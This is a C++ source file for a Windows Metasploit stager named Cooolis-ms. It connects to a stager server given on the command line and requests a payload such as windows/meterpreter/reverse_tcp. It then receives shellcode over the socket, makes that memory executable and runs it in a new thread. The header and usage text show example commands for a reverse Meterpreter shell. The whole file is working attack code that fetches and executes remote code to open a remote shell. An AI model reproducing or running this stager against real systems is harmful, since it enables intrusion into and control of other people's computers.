/**************************
Code By Rvn0xsy
https://payloads.online
Email:rvn0xsy@gmail.com
Commandline e.g.>Cooolis-ms-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.164.136,LPORT=8866 -H 192.168.164.136 -P 8899
***************************/

#include <WinSock2.h>
#include <iostream>
#include <Windows.h>
#include <winbase.h>
#include <tchar.h>
#include <Ws2tcpip.h>


#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib , "Advapi32.lib")


using namespace std;

CONST INT PAYLOAD_LEN = 200;

#pragma pack(4)
struct stager {
	char payload[PAYLOAD_LEN];
	char options[PAYLOAD_LEN];
};
#pragma pack()

// 输出帮助信息
VOID Usage() {
	cout << "[*]Usage : Cooolis-ms.exe -p [PAYLOAD] -s [PAYLOAD OPTIONS] -H [Stager Host] -P [Stager Port]" << endl;
	cout << "\t-p [PAYLOAD] \tMSF PAYLOAD TYPE" << endl;
	cout << "\t-s [PAYLOAD OPTIONS] \tMSF PAYLOAD OPTIONS" << endl;
	cout << "\t-H [Stager Host] \tCooolis-Server Host" << endl;
	cout << "\t-P [Stager Port] \tCoolis-Server Port" << endl;
	cout << "[*]Example : Pending-Msf.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.117.1,LPORT=1122 -H 192.168.117.1 -P 4474" << endl;
}

// 将Unicode转换为ANSI
char* UnicodeToAnsi(const wchar_t* szStr)
{
	int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
	if (nLen == 0)
	{
		return NULL;
	}
	char* pResult = new char[nLen];
	WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
	return pResult;
}


int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance,  _In_  LPSTR lpCmdLine,  _In_  int nCmdShow )
// int main()
{

	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	// 初始化
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		cout << "[!]WSAStartup Error " << GetLastError() << endl;
		return 0;
	}

	PWCHAR * szArgList = NULL; // 参数列表
	int argCount = NULL; // 参数个数
	DWORD port = NULL; // RPC 端口
	PWCHAR ip = NULL; // RPC IP
	// 初始化winsock
	HANDLE hThread = NULL; // 线程句柄
	SOCKET socks; // 套接字
	stager sd;		// 发送数据结构体
	DWORD dwPayloadLength = 0; // shellcode 大小
	DWORD dwOldProtect; // 内存保护属性
	struct sockaddr_in sock_addr; // 套接字属性
	// 获取命令行参数及路径
	
	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 创建套接字
	ZeroMemory(sd.payload, PAYLOAD_LEN); // 清空内存
	ZeroMemory(sd.options, PAYLOAD_LEN); // 清空内存

	DWORD dwSdSizeof = sizeof(sd);
		// 如果不存在后门，则为首次运行，需要接收参数
		// 解析参数
		PWCHAR pstrPayload = NULL;
		PWCHAR pstrOptions = NULL;
		szArgList = CommandLineToArgvW(GetCommandLine(),&argCount);
		// 如果参数小于9个，则退出
		if (szArgList == NULL || argCount < 9)
		{

			Usage();
			ExitProcess(0);
		}

		for (INT i = 0; i < argCount; i++)
		{
			if (lstrcmpW(szArgList[i], TEXT("-p")) == 0) {
				pstrPayload = szArgList[++i];
				
				char* cPay = UnicodeToAnsi(pstrPayload);

				CopyMemory(sd.payload, cPay, strlen(cPay));
			}
			else if (lstrcmpW(szArgList[i], TEXT("-s")) == 0)
			{

				pstrOptions = szArgList[++i];
				
				char* opt = UnicodeToAnsi(pstrOptions);
				CopyMemory(sd.options, opt, strlen(opt));

			}
			else if (lstrcmpW(szArgList[i], TEXT("-H")) == 0)
			{
				ip = szArgList[++i];
				
			}
			else if (lstrcmpW(szArgList[i], TEXT("-P")) == 0)
			{
				PWCHAR wport = szArgList[++i];
				
				port = _wtoi(wport);
			}
			else {
				Usage();
			}
	}

	InetPtonW(AF_INET, ip, &(sock_addr.sin_addr)); // 转换IP地址
	sock_addr.sin_family = AF_INET;		// 套接字类型
	sock_addr.sin_port = htons(port);  // 套接字端口
	// 连接套接字
	while (connect(socks, (struct sockaddr*) & sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
		cout << "[!]Connect error ! " << GetLastError() << endl;
		Sleep(5000);
		continue;
	}

	// 发送字节数
	send(socks, (char*)& sd, sizeof(sd), 0);

	// 接收Shellcode长度
	recv(socks, (char*)& dwPayloadLength, sizeof(DWORD), 0);

	// 等待三秒执行
	Sleep(3000);

	// 申请内存页
	CHAR* pSpace = (CHAR*)VirtualAlloc(NULL, dwPayloadLength, MEM_COMMIT, PAGE_READWRITE);

	// 将Shellcode放入内存页
	recv(socks, pSpace, dwPayloadLength,0);

	// 关闭套接字
	closesocket(socks);
	// 将内存页属性更改为可执行
	VirtualProtect(pSpace, dwPayloadLength, PAGE_EXECUTE_READ, &dwOldProtect);
	// 创建线程，执行Shellcode
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pSpace, NULL, NULL, NULL);
	// 等待线程执行完毕
	WaitForSingleObject(hThread, INFINITE);
	// 释放内存
	VirtualFree(hThread, 0, MEM_RELEASE);
	return 0;
}

